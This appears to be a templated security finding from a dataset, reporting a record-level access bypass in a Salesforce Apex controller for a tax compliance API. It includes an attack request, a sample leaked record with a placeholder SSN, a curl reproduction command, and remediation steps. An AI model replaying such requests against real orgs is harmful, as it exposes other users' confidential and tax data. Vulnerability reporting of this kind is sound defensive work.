# Security Analysis Report
**System:** TaxGrid Compliance API (Salesforce-Integrated)
**Domain:** Tax Compliance / RegTech
**Example ID:** SF-0048
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform — Pattern 9.2 | SOQL record-level access bypass on `QuoteController.getQuoteDetails` — any tax compliance Quote record readable |

---

## Finding 1 — SOQL Record-Level Access Bypass on Quote Object (Pattern 9.2)

### Summary
The Apex controller `QuoteController` on TaxGrid Compliance API (`56f9ec5d.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Quote object. Per §5.0 Pattern 9.2, Salesforce's platform SOQL record-level security is negated. An attacker substitutes any `quoteId` in the Aura payload to read Quote records owned by others. In a tax compliance context, Quote records may contain tax filing data, compliance assessment reports, and taxpayer PII.

**Pattern:** 9.2 — SOQL and Salesforce record-level access (Platform)
**Affected controller:** `c.QuoteController.getQuoteDetails`
**Affected endpoint:** `POST https://56f9ec5d.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://56f9ec5d.lightning.force.com/aura
Authorization: Bearer 00D56F9EC5D!AR56f9ec5d...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D56F9EC5D!AR56f9ec5d...

message={"actions":[{"id":"1;a","descriptor":"c.QuoteController.getQuoteDetails","callingDescriptor":"UNKNOWN",
"params":{"quoteId":"001EC5D","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Tax Quote Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001EC5D", "Name": "Victim Quote Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-70-7853"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D56F9EC5D!AR56f9ec5d..."
curl -s -X POST "https://56f9ec5d.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.QuoteController.getQuoteDetails","callingDescriptor":"UNKNOWN","params":{"quoteId":"001EC5D","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-70-7853
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class QuoteController { ... }`
2. `WHERE Id = :quoteId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Remove client-controlled `fields` parameter; use server-side allowlist.
4. Validate `aura.token`.
5. **Tax compliance note:** Taxpayer SSN exposure (`000-70-7853`) and Quote data constitute a direct IRS/HMRC data protection breach.
